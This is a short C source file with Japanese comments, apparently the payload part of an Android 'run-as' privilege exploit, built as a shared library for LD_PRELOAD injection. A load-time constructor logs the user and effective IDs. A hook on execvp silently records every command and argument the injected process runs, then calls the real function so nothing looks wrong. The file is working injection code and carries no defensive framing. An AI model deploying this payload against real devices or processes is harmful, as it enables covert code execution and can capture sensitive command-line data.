/*
 * malicious.c - LD_PRELOAD 用ペイロード
 * 
 * コンパイル: ndk-build または gcc -fPIC -shared -o malicious.so malicious.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <sys/types.h>

// コンストラクタ: ライブラリロード時に実行される
__attribute__((constructor)) void init(void) {
    uid_t uid = getuid();
    uid_t euid = geteuid();
    FILE *fp = fopen("/data/local/tmp/runas_exploit.log", "a");
    if (fp) {
        fprintf(fp, "[malicious.so] ロードされました。UID=%d, EUID=%d\n", uid, euid);
        fclose(fp);
    }
    // 標準エラーにも出力（adb logcat やシェルで見える）
    fprintf(stderr, "[malicious.so] ロードされました。UID=%d, EUID=%d\n", uid, euid);
}

// execvp をフックして引数をログに残す（オプション）
int execvp(const char *file, char *const argv[]) {
    typedef int (*orig_execvp_t)(const char *, char *const *);
    orig_execvp_t orig_execvp = (orig_execvp_t)dlsym(RTLD_NEXT, "execvp");

    FILE *fp = fopen("/data/local/tmp/runas_exploit.log", "a");
    if (fp) {
        fprintf(fp, "[malicious.so] execvp フック: file=%s\n", file);
        for (int i = 0; argv && argv[i]; i++) {
            fprintf(fp, "  argv[%d]=%s\n", i, argv[i]);
        }
        fclose(fp);
    }
    fprintf(stderr, "[malicious.so] execvp フック: %s\n", file);

    // 元の execvp を呼び出して正常実行させる
    return orig_execvp(file, argv);
}
